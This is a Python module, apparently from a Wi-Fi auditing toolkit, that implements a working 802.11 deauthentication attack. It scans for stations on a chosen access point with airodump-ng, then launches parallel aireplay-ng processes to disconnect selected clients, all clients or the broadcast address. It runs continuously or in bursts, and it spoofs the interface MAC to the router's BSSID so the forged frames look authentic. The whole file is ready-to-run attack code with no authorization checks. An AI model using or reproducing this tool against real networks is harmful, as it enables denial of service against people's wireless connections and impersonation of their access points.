#!/usr/bin/env python3
"""
Standalone Deauth Attack module.

How it works
────────────
aireplay-ng --deauth constructs bidirectional 802.11 deauthentication frames:
  • AP  → Client  : "you are deauthenticated" (AP spoofed as source)
  • Client → AP   : "I am deauthenticating"   (client MAC spoofed as source)
Both directions are sent, making the disconnection immediate and persistent.

Before firing, we optionally spoof our monitor interface's hardware MAC to the
AP's BSSID so every injected frame at the driver level originates from the
router's address — maximum authenticity.

Features
────────
  • Client scanner   — discover associated stations via airodump-ng CSV
  • Multi-select     — target one, many, or all clients simultaneously
  • Broadcast mode   — single deauth to FF:FF:FF:FF:FF:FF (kicks all at once)
  • MAC spoof        — interface MAC → AP BSSID (restored on exit)
  • Continuous mode  — endless bursts with live stats display (Ctrl+C to stop)
  • Burst mode       — send exactly N frames and stop
  • Parallel procs   — one aireplay-ng per target client for max throughput
"""

import os
import re
import sys
import time
import shutil
import threading
import subprocess
from modules.banner import C, info, success, warn, error, print_section

CLIENT_SCAN_TIME  = 15       # seconds to run airodump-ng looking for clients
BURST_DEFAULT     = 64       # deauth frames per burst
BURST_INTERVAL    =  2       # seconds between bursts in loop mode
STATS_REFRESH     =  1       # seconds between display redraws


# ─────────────────────────────────────────────────────────────────────────────
# Public entry point
# ─────────────────────────────────────────────────────────────────────────────

def deauth_menu(interface: str, target: dict | None = None):
    """
    Main menu for the standalone deauth attack.
    `target` is a dict from the scanner (ssid, bssid, channel).
    If None the user is prompted to enter AP details manually.
    """
    print_section("Deauth Attack")

    # ── Resolve AP target ──────────────────────────────────────────────────
    if not target:
        warn("No target selected from scanner. Enter AP details manually.")
        bssid = input(f"  {C.YELLOW}AP BSSID (XX:XX:XX:XX:XX:XX): {C.RESET}").strip().upper()
        if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
            error("Invalid BSSID format.")
            return
        try:
            channel = int(input(f"  {C.YELLOW}AP Channel: {C.RESET}").strip())
        except ValueError:
            error("Invalid channel.")
            return
        ssid = input(f"  {C.YELLOW}SSID (optional, Enter to skip): {C.RESET}").strip() or bssid
        target = {'bssid': bssid, 'channel': channel, 'ssid': ssid}
    else:
        bssid   = target['bssid']
        channel = target['channel']
        ssid    = target.get('ssid', bssid)

    info(f"AP: {ssid}  [{bssid}]  CH{channel}")

    # ── Sub-menu ───────────────────────────────────────────────────────────
    print(f"""
  {C.WHITE}Attack Mode:{C.RESET}
  {C.GREEN}[1]{C.RESET} Deauth specific client(s)  {C.DIM}(scan clients, then select){C.RESET}
  {C.GREEN}[2]{C.RESET} Deauth ALL clients          {C.DIM}(scan + send to each MAC){C.RESET}
  {C.GREEN}[3]{C.RESET} Broadcast deauth            {C.DIM}(one frame to FF:FF:FF:FF:FF:FF){C.RESET}
  {C.GREEN}[4]{C.RESET} Manual target entry         {C.DIM}(enter client MAC directly){C.RESET}
  {C.RED}[0]{C.RESET} Back
""")
    mode = input(f"  {C.YELLOW}Mode: {C.RESET}").strip()
    if mode == '0':
        return

    # ── Spoof option ───────────────────────────────────────────────────────
    do_spoof = False
    print(f"""
  {C.WHITE}MAC Spoof:{C.RESET}
  Spoof our interface MAC → AP's BSSID so deauth frames look
  indistinguishable from legitimate router frames.
  {C.DIM}(Restored automatically when attack ends){C.RESET}
""")
    s = input(f"  {C.YELLOW}Enable MAC spoof? [Y/n]: {C.RESET}").strip().lower()
    do_spoof = s != 'n'

    # ── Burst vs continuous ────────────────────────────────────────────────
    print(f"""
  {C.WHITE}Duration:{C.RESET}
  {C.GREEN}[1]{C.RESET} Continuous  (run until Ctrl+C)
  {C.GREEN}[2]{C.RESET} Burst       (send N packets and stop)
""")
    dur_choice = input(f"  {C.YELLOW}Duration: {C.RESET}").strip()
    continuous = dur_choice != '2'
    burst_count = BURST_DEFAULT
    if not continuous:
        try:
            burst_count = int(input(f"  {C.YELLOW}Packets per target [{BURST_DEFAULT}]: {C.RESET}").strip() or str(BURST_DEFAULT))
        except ValueError:
            burst_count = BURST_DEFAULT

    # ── Resolve client list ────────────────────────────────────────────────
    clients: list[str] = []

    if mode in ('1', '2'):
        info(f"Scanning for clients on {bssid} for {CLIENT_SCAN_TIME}s...")
        found_clients = _scan_clients(interface, bssid, channel, CLIENT_SCAN_TIME)
        if not found_clients:
            warn("No associated clients found during scan window.")
            warn("They may reconnect later — you can try broadcast mode instead.")
            c = input(f"  {C.YELLOW}Switch to broadcast mode? [Y/n]: {C.RESET}").strip().lower()
            if c != 'n':
                clients = ['FF:FF:FF:FF:FF:FF']
            else:
                return
        elif mode == '1':
            clients = _select_clients(found_clients)
            if not clients:
                return
        else:   # mode 2: all clients
            clients = [c['mac'] for c in found_clients]
            info(f"Targeting all {len(clients)} associated client(s).")

    elif mode == '3':
        clients = ['FF:FF:FF:FF:FF:FF']
        info("Broadcast deauth selected (FF:FF:FF:FF:FF:FF).")

    elif mode == '4':
        raw = input(f"  {C.YELLOW}Client MAC(s), comma-separated: {C.RESET}").strip().upper()
        for mac in [m.strip() for m in raw.split(',') if m.strip()]:
            if re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', mac):
                clients.append(mac)
            else:
                warn(f"Skipping invalid MAC: {mac}")
        if not clients:
            error("No valid client MACs entered.")
            return
    else:
        error("Invalid mode.")
        return

    # ── Run attack ─────────────────────────────────────────────────────────
    _run_attack(interface, bssid, ssid, channel, clients,
                do_spoof, continuous, burst_count)


# ─────────────────────────────────────────────────────────────────────────────
# Client scanner
# ─────────────────────────────────────────────────────────────────────────────

def _scan_clients(interface: str, bssid: str, channel: int,
                  duration: int) -> list[dict]:
    """
    Run airodump-ng focused on the AP and return associated client MACs.
    """
    import tempfile
    tmp_dir  = tempfile.mkdtemp(prefix='wifiaudit_deauth_')
    out_base = os.path.join(tmp_dir, 'clients')

    proc = subprocess.Popen(
        ['airodump-ng',
         '--bssid', bssid,
         '--channel', str(channel),
         '--write', out_base,
         '--output-format', 'csv',
         '--write-interval', '2',
         interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Countdown with live client table
    csv_path = out_base + '-01.csv'
    try:
        for remaining in range(duration, 0, -1):
            time.sleep(1)
            clients = _parse_clients_csv(csv_path, bssid)
            _print_client_table(clients,
                                f"Scanning... {remaining}s  "
                                f"({len(clients)} client(s) found)")
    except KeyboardInterrupt:
        warn("Client scan interrupted.")
    finally:
        proc.terminate()
        proc.wait()

    return _parse_clients_csv(csv_path, bssid)


def _parse_clients_csv(csv_path: str, ap_bssid: str) -> list[dict]:
    """
    Parse the Station section of an airodump-ng CSV for clients
    associated with ap_bssid.

    Station CSV columns:
      Station MAC(0), First time seen(1), Last time seen(2),
      Power(3), # packets(4), BSSID(5), Probed ESSIDs(6)
    """
    if not os.path.exists(csv_path):
        return []

    clients   = []
    in_station = False

    try:
        with open(csv_path, 'r', errors='replace') as f:
            for line in f:
                stripped = line.strip()
                if stripped.startswith('Station MAC'):
                    in_station = True
                    continue
                if not in_station or not stripped:
                    continue
                parts = [p.strip() for p in stripped.split(',')]
                if len(parts) < 6:
                    continue
                mac       = parts[0].upper()
                assoc_bss = parts[5].upper().strip()
                power     = parts[3].strip()
                pkts      = parts[4].strip()
                probed    = parts[6].strip() if len(parts) > 6 else ''

                if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', mac):
                    continue
                if assoc_bss != ap_bssid.upper():
                    continue

                clients.append({
                    'mac':    mac,
                    'power':  power,
                    'pkts':   pkts,
                    'probed': probed,
                })
    except OSError:
        pass

    return clients


def _print_client_table(clients: list[dict], caption: str = ''):
    os.system('clear')
    if caption:
        print(f"\n  {C.CYAN}{caption}{C.RESET}\n")

    if not clients:
        print(f"  {C.DIM}No associated clients yet...{C.RESET}")
        return

    fmt = "  {:<4} {:<20} {:<8} {:<8} {}"
    print(C.BOLD + fmt.format('#', 'CLIENT MAC', 'PWR', 'PKTS', 'PROBED SSIDs') + C.RESET)
    print(f"  {'─'*65}")
    for i, c in enumerate(clients, 1):
        print(fmt.format(
            f"{C.WHITE}{i}{C.RESET}",
            c['mac'],
            c['power'],
            c['pkts'],
            c['probed'][:35],
        ))


def _select_clients(clients: list[dict]) -> list[str]:
    """Interactive multi-select from a client list."""
    _print_client_table(clients, f"{len(clients)} client(s) found — select targets")
    print(f"\n  {C.DIM}Enter numbers comma-separated, 'all', or 0 to cancel.{C.RESET}")
    raw = input(f"  {C.YELLOW}Select: {C.RESET}").strip().lower()

    if raw == '0' or raw == '':
        return []
    if raw == 'all':
        return [c['mac'] for c in clients]

    selected = []
    for part in raw.split(','):
        try:
            idx = int(part.strip()) - 1
            if 0 <= idx < len(clients):
                selected.append(clients[idx]['mac'])
        except ValueError:
            pass

    if not selected:
        error("No valid selection.")
    return selected


# ─────────────────────────────────────────────────────────────────────────────
# MAC spoofing
# ─────────────────────────────────────────────────────────────────────────────

def _get_interface_mac(interface: str) -> str | None:
    try:
        r = subprocess.run(['ip', 'link', 'show', interface],
                           capture_output=True, text=True)
        m = re.search(r'link/ether\s+([0-9a-fA-F:]{17})', r.stdout)
        if m:
            return m.group(1).upper()
    except FileNotFoundError:
        pass
    return None


def _spoof_mac(interface: str, new_mac: str) -> str | None:
    """
    Spoof `interface` MAC to `new_mac`.
    Returns the original MAC (needed for restore), or None on failure.
    """
    original = _get_interface_mac(interface)
    if not original:
        warn("Could not read original MAC — skipping spoof.")
        return None

    info(f"Spoofing MAC: {original} → {new_mac}")

    # Method 1: ip link (works without macchanger)
    cmds = [
        ['ip', 'link', 'set', interface, 'down'],
        ['ip', 'link', 'set', 'dev', interface, 'address', new_mac],
        ['ip', 'link', 'set', interface, 'up'],
    ]
    failed = False
    for cmd in cmds:
        r = subprocess.run(cmd, capture_output=True)
        if r.returncode != 0:
            failed = True
            break

    if not failed:
        verify = _get_interface_mac(interface)
        if verify and verify.upper() == new_mac.upper():
            success(f"MAC spoofed → {new_mac}")
            return original

    # Method 2: macchanger fallback
    if shutil.which('macchanger'):
        subprocess.run(['ip', 'link', 'set', interface, 'down'],
                       capture_output=True)
        r = subprocess.run(['macchanger', '-m', new_mac, interface],
                           capture_output=True, text=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'],
                       capture_output=True)
        if r.returncode == 0:
            success(f"MAC spoofed (macchanger) → {new_mac}")
            return original
        warn(f"macchanger failed: {r.stderr.strip()}")
    else:
        warn("ip link MAC change failed and macchanger not found.")

    warn("MAC spoof unsuccessful — proceeding without spoof.")
    return None


def _restore_mac(interface: str, original_mac: str):
    """Restore interface MAC to `original_mac`."""
    info(f"Restoring MAC → {original_mac}")
    cmds = [
        ['ip', 'link', 'set', interface, 'down'],
        ['ip', 'link', 'set', 'dev', interface, 'address', original_mac],
        ['ip', 'link', 'set', interface, 'up'],
    ]
    for cmd in cmds:
        subprocess.run(cmd, capture_output=True)

    if shutil.which('macchanger'):
        subprocess.run(['ip', 'link', 'set', interface, 'down'],
                       capture_output=True)
        subprocess.run(['macchanger', '-m', original_mac, interface],
                       capture_output=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'],
                       capture_output=True)

    success("MAC restored.")


# ─────────────────────────────────────────────────────────────────────────────
# Attack runner
# ─────────────────────────────────────────────────────────────────────────────

def _run_attack(interface: str, bssid: str, ssid: str, channel: int,
                clients: list[str], do_spoof: bool,
                continuous: bool, burst_count: int):
    """
    Launch aireplay-ng processes for each target client.
    Handles MAC spoof/restore and live stats display.
    """
    original_mac = None

    if do_spoof:
        original_mac = _spoof_mac(interface, bssid)
        if original_mac is None:
            do_spoof = False   # spoof failed; continue without

    # Shared stats dict: {client_mac: {'sent': int, 'acks': int, 'proc': Popen}}
    stats: dict[str, dict] = {
        mac: {'sent': 0, 'acks': 0, 'proc': None}
        for mac in clients
    }
    start_time = time.time()

    # Reader threads: one per client, parses aireplay-ng stdout
    def _reader(mac: str):
        proc = stats[mac]['proc']
        if not proc:
            return
        pkt_re = re.compile(
            r'Sending\s+(\d+)\s+(?:directed\s+)?DeAuth.*?\[\s*(\d+)\|(\d+)\s+ACKs?\]',
            re.IGNORECASE
        )
        try:
            for line in proc.stdout:
                m = pkt_re.search(line)
                if m:
                    stats[mac]['sent'] += int(m.group(1))
                    stats[mac]['acks']  = int(m.group(3))   # latest ACK count
        except Exception:
            pass

    try:
        if continuous:
            _run_continuous(interface, bssid, ssid, clients, stats,
                            start_time, do_spoof, original_mac)
        else:
            _run_burst(interface, bssid, ssid, clients, stats,
                       burst_count, start_time, do_spoof, original_mac)
    except KeyboardInterrupt:
        print(f"\n\n  {C.YELLOW}[!] Attack interrupted.{C.RESET}")
    finally:
        # Kill all aireplay-ng processes
        for mac, s in stats.items():
            proc = s.get('proc')
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except Exception:
                    proc.kill()
        # Restore MAC
        if original_mac:
            _restore_mac(interface, original_mac)
        # Final stats
        elapsed = time.time() - start_time
        total_sent = sum(s['sent'] for s in stats.values())
        total_acks = sum(s['acks'] for s in stats.values())
        print()
        info(f"Attack finished.  Elapsed: {elapsed:.0f}s  "
             f"Packets: {total_sent:,}  ACKs: {total_acks:,}")


def _run_continuous(interface, bssid, ssid, clients, stats,
                    start_time, do_spoof, original_mac):
    """Continuous deauth: spawn infinite (-0 count) aireplay-ng per target."""

    # Launch one process per client with --deauth 0 (infinite)
    for mac in clients:
        proc = subprocess.Popen(
            _build_cmd(interface, bssid, mac, 0),   # 0 = infinite
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )
        stats[mac]['proc'] = proc
        t = threading.Thread(target=_reader_thread, args=(mac, stats),
                             daemon=True)
        t.start()

    # Display loop
    while True:
        _draw_stats(ssid, bssid, clients, stats, do_spoof,
                    time.time() - start_time, continuous=True)
        time.sleep(STATS_REFRESH)

        # Remove finished processes
        all_dead = all(
            s['proc'] is not None and s['proc'].poll() is not None
            for s in stats.values()
        )
        if all_dead:
            warn("All aireplay-ng processes have exited unexpectedly.")
            break


def _run_burst(interface, bssid, ssid, clients, stats,
               burst_count, start_time, do_spoof, original_mac):
    """Burst mode: send exactly `burst_count` deauth frames per target."""

    # Launch processes (finite count)
    for mac in clients:
        proc = subprocess.Popen(
            _build_cmd(interface, bssid, mac, burst_count),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True, bufsize=1,
        )
        stats[mac]['proc'] = proc
        t = threading.Thread(target=_reader_thread, args=(mac, stats),
                             daemon=True)
        t.start()

    # Wait for all to finish, updating display
    while True:
        _draw_stats(ssid, bssid, clients, stats, do_spoof,
                    time.time() - start_time, continuous=False)
        all_done = all(
            s['proc'] is not None and s['proc'].poll() is not None
            for s in stats.values()
        )
        if all_done:
            break
        time.sleep(STATS_REFRESH)

    _draw_stats(ssid, bssid, clients, stats, do_spoof,
                time.time() - start_time, continuous=False)
    success("Burst complete.")


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _build_cmd(interface: str, bssid: str, client_mac: str,
               count: int) -> list[str]:
    """
    Build aireplay-ng deauth command.
    count=0  → infinite
    count>0  → finite burst
    Omitting -c sends broadcast deauth to all clients simultaneously.
    """
    cmd = ['aireplay-ng', '--deauth', str(count), '-a', bssid]
    if client_mac != 'FF:FF:FF:FF:FF:FF':
        cmd += ['-c', client_mac]
    cmd.append(interface)
    return cmd


def _reader_thread(mac: str, stats: dict):
    """Thread target: reads aireplay-ng output and updates stats dict."""
    proc = stats[mac]['proc']
    if not proc:
        return
    pkt_re = re.compile(
        r'Sending\s+(\d+)\s+(?:directed\s+)?DeAuth.*?\[\s*(\d+)\|(\d+)\s+ACKs?\]',
        re.IGNORECASE
    )
    try:
        for line in proc.stdout:
            m = pkt_re.search(line)
            if m:
                # m.group(1) = frames in this burst
                # m.group(2) = cumulative deauth sent (from aireplay counter)
                # m.group(3) = acks received
                stats[mac]['sent'] += int(m.group(1))
                stats[mac]['acks']  = int(m.group(3))
    except Exception:
        pass


def _draw_stats(ssid: str, bssid: str, clients: list[str],
                stats: dict, spoofed: bool, elapsed: float,
                continuous: bool):
    """Redraw the live stats display."""
    os.system('clear')
    mode_label = 'CONTINUOUS' if continuous else 'BURST'
    stop_hint  = '  Ctrl+C to stop' if continuous else ''

    w = 65
    bar_fill = '█' * min(int(elapsed / 2) % 20 + 1, 20)  # animated
    bar_dim  = '░' * (20 - len(bar_fill))

    print(f"\n  {C.BOLD}{C.RED}{'═'*w}")
    print(f"  DEAUTH ATTACK — {mode_label}{stop_hint}")
    print(f"  {'═'*w}{C.RESET}")
    print(f"  {C.DIM}AP    :{C.RESET} {C.CYAN}{ssid}{C.RESET}  "
          f"[{C.WHITE}{bssid}{C.RESET}]")
    spoof_str = (f"{C.GREEN}YES{C.RESET} (interface MAC → {bssid})"
                 if spoofed else f"{C.DIM}NO{C.RESET}")
    print(f"  {C.DIM}Spoof :{C.RESET} {spoof_str}")
    print(f"  {C.DIM}Status:{C.RESET} "
          f"{C.RED}{bar_fill}{C.DIM}{bar_dim}{C.RESET}  "
          f"Elapsed: {C.YELLOW}{elapsed:.0f}s{C.RESET}")
    print(f"  {C.CYAN}{'─'*w}{C.RESET}")

    # Column header
    hdr = f"  {C.BOLD}{'TARGET MAC':<22} {'SENT':>9}  {'ACKS':>6}  STATUS{C.RESET}"
    print(hdr)
    print(f"  {'─'*w}")

    total_sent = 0
    total_acks = 0

    for mac in clients:
        s     = stats[mac]
        sent  = s['sent']
        acks  = s['acks']
        total_sent += sent
        total_acks += acks

        proc  = s.get('proc')
        alive = proc is not None and proc.poll() is None

        status = (f"{C.GREEN}FIRING{C.RESET}" if alive
                  else f"{C.DIM}DONE{C.RESET}")

        mac_label = ('Broadcast (all)' if mac == 'FF:FF:FF:FF:FF:FF'
                     else mac)
        print(f"  {C.WHITE}{mac_label:<22}{C.RESET} "
              f"{C.YELLOW}{sent:>9,}{C.RESET}  "
              f"{C.GREEN}{acks:>6,}{C.RESET}  {status}")

    print(f"  {'─'*w}")
    print(f"  {'TOTAL':<22} {C.BOLD}{C.YELLOW}{total_sent:>9,}{C.RESET}  "
          f"{C.BOLD}{C.GREEN}{total_acks:>6,}{C.RESET}")
    print(f"  {C.CYAN}{'═'*w}{C.RESET}\n")
